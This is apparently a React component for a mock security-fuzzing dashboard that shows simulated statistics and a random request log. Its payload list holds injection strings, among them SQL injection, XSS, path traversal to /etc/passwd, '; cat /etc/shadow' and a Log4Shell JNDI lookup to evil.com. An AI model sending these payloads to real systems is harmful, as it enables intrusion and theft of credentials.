import React, { useState, useEffect, useRef } from 'react';
import './FuzzingActivity.css';

interface LogEntry {
  id: string;
  time: string;
  req: string;
  code: number;
  payload: string;
}

const payloads = [
  "' OR 1=1--",
  "<script>alert(1)</script>",
  "admin' #",
  "../../../etc/passwd",
  "'; WAITFOR DELAY '0:0:5'--",
  "${jndi:ldap://evil.com/a}",
  "{{7*7}}",
  "; cat /etc/shadow",
  "\\x00",
  "' UNION SELECT NULL, NULL--"
];

export default function FuzzingActivity() {
  const [requestCount, setRequestCount] = useState(24821);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const streamRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    let isActive = true;

    const addLog = () => {
      if (!isActive) return;

      const payload = payloads[Math.floor(Math.random() * payloads.length)];
      const rand = Math.random();
      let code = 200;
      if (rand < 0.1) code = 500;
      else if (rand < 0.3) code = 403;
      else if (rand < 0.4) code = 400;

      setRequestCount(prev => prev + 1);
      
      const newLog = {
        id: Math.random().toString(36).substr(2, 9),
        time: new Date().toISOString().split('T')[1].substring(0, 12),
        req: `REQ-${requestCount + 1}`,
        code,
        payload
      };

      setLogs(prev => {
        const next = [...prev, newLog];
        if (next.length > 50) return next.slice(next.length - 50);
        return next;
      });

      if (streamRef.current) {
        streamRef.current.scrollTop = streamRef.current.scrollHeight;
      }

      setTimeout(addLog, Math.random() * 750 + 50);
    };

    // Initial populate
    const initialLogs: LogEntry[] = Array.from({length: 15}).map((_, i) => ({
      id: Math.random().toString(36).substr(2, 9),
      time: new Date().toISOString().split('T')[1].substring(0, 12),
      req: `REQ-${24821 - 15 + i}`,
      code: 200,
      payload: payloads[Math.floor(Math.random() * payloads.length)]
    }));
    
    setLogs(initialLogs);

    setTimeout(addLog, 500);

    return () => { isActive = false; };
  }, [requestCount]);

  const getCodeClass = (code: number) => {
    switch(code) {
      case 200: return 'code-200';
      case 400: return 'code-400';
      case 403: return 'code-403';
      case 500: return 'code-500';
      default: return '';
    }
  };

  return (
    <div className="fuzzing-container">
      
      {/* Stats Row */}
      <div className="stats-grid">
        <div className="stat-card">
          <div className="stat-glow" style={{backgroundColor: 'rgba(88, 166, 255, 0.1)'}}></div>
          <div className="stat-header">
            <span className="stat-title">Requests Sent</span>
            <span className="material-symbols-outlined text-primary">send</span>
          </div>
          <div className="stat-value text-on-surface">
            {requestCount.toLocaleString()} <span className="stat-sub text-primary">+1.2k/s</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-glow" style={{backgroundColor: 'rgba(193, 199, 208, 0.1)'}}></div>
          <div className="stat-header">
            <span className="stat-title">Payloads Tested</span>
            <span className="material-symbols-outlined text-secondary">category</span>
          </div>
          <div className="stat-value text-on-surface">
            8,432 <span className="stat-sub text-secondary">Active</span>
          </div>
        </div>

        <div className="stat-card" style={{boxShadow: '0 10px 15px -3px rgba(255, 186, 66, 0.1)'}}>
          <div className="stat-glow" style={{backgroundColor: 'rgba(255, 186, 66, 0.1)'}}></div>
          <div className="stat-header">
            <span className="stat-title" style={{color: 'var(--color-tertiary)'}}>Anomalies Detected</span>
            <span className="material-symbols-outlined text-tertiary">warning</span>
          </div>
          <div className="stat-value" style={{color: 'var(--color-tertiary)'}}>
            91 <span className="stat-sub" style={{opacity: 0.7}}>Review required</span>
          </div>
        </div>
      </div>

      <div className="mid-grid">
        {/* Current Testing Card */}
        <div className="panel-card">
          <svg className="bg-decoration decor-spin" fill="currentColor" viewBox="0 0 100 100">
            <circle cx="50" cy="50" r="40" stroke="currentColor" strokeWidth="8" fill="none" strokeDasharray="10 10" />
          </svg>
          <div style={{position: 'relative', zIndex: 10}}>
            <div className="exec-header">
              <span className="exec-title">Target Execution</span>
              <span className="priority-badge">
                <span className="material-symbols-outlined" style={{fontSize: '14px'}}>local_fire_department</span>
                Priority: High
              </span>
            </div>

            <div className="target-info">
              <div className="info-label">Endpoint</div>
              <div className="endpoint-display">
                <span className="method-tag">POST</span>
                <span className="endpoint-path">/api/v1/auth/login</span>
              </div>
            </div>

            <div className="info-grid">
              <div className="info-box">
                <div className="box-label">Target Parameter</div>
                <div className="box-value">username</div>
              </div>
              <div className="info-box">
                <div className="box-label">Mutation Strategy</div>
                <div className="strategy-value">
                  <span className="pulse-dot"></span>
                  Adaptive (Context-Aware)
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Payload Distribution */}
        <div className="panel-card">
          <h3 className="dist-title">Payload Distribution</h3>
          <div className="dist-list">
            
            <div className="dist-item">
              <div className="dist-row">
                <span className="dist-name">SQL Injection</span>
                <span className="dist-pct">35%</span>
              </div>
              <div className="dist-bar-bg">
                <div className="dist-bar-fill bg-primary" style={{width: '35%'}}></div>
              </div>
            </div>

            <div className="dist-item">
              <div className="dist-row">
                <span className="dist-name">Cross-Site Scripting</span>
                <span className="dist-pct">25%</span>
              </div>
              <div className="dist-bar-bg">
                <div className="dist-bar-fill bg-tertiary" style={{width: '25%'}}></div>
              </div>
            </div>

            <div className="dist-item">
              <div className="dist-row">
                <span className="dist-name">OS Command Injection</span>
                <span className="dist-pct">15%</span>
              </div>
              <div className="dist-bar-bg">
                <div className="dist-bar-fill bg-error" style={{width: '15%'}}></div>
              </div>
            </div>

            <div className="dist-item">
              <div className="dist-row">
                <span className="dist-name">Path Traversal</span>
                <span className="dist-pct">10%</span>
              </div>
              <div className="dist-bar-bg">
                <div className="dist-bar-fill bg-secondary" style={{width: '10%'}}></div>
              </div>
            </div>

            <div className="dist-item">
              <div className="dist-row">
                <span className="dist-name">Other / Format String</span>
                <span className="dist-pct">15%</span>
              </div>
              <div className="dist-bar-bg">
                <div className="dist-bar-fill bg-outline-variant" style={{width: '15%'}}></div>
              </div>
            </div>

          </div>
        </div>
      </div>

      {/* Terminal Stream */}
      <div className="stream-card">
        <div className="stream-header">
          <div className="stream-title">
            <span className="material-symbols-outlined text-primary" style={{fontSize: '18px'}}>terminal</span>
            Live Request Stream
          </div>
          <div className="stream-status">
            <span className="status-dot-active"></span>
            <span className="stream-status-text">Active</span>
          </div>
        </div>
        
        <div className="stream-body" ref={streamRef}>
          {logs.map((log) => (
            <div key={log.id} className={`stream-row ${log.code === 500 ? 'err-row' : ''}`}>
              <span className="stream-time">[{log.time}]</span>
              <span className="stream-req">{log.req}</span>
              <span className={`stream-code ${getCodeClass(log.code)}`}>{log.code}</span>
              <span className="stream-payload">
                payload: <span className="payload-val">{log.payload}</span>
              </span>
              {log.code === 500 ? (
                <span className="stream-anomaly">
                  <span className="material-symbols-outlined" style={{fontSize: '14px'}}>bug_report</span> ANOMALY DETECTED
                </span>
              ) : (
                <span style={{width: '128px'}}></span>
              )}
            </div>
          ))}
        </div>
      </div>

    </div>
  );
}
